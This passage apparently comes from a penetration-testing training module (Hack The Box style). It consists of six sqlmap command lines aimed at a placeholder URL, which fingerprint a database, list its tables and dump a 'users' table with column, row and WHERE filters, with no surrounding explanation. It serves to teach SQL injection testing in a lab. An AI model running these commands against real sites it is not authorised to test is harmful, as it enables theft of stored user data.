...
```shell-session
frank-106@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
...
```shell-session
frank-106@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
...
```shell-session
frank-106@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
...
```shell-session
frank-106@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
...
```shell-session
frank-106@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
...
```shell-session
frank-106@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
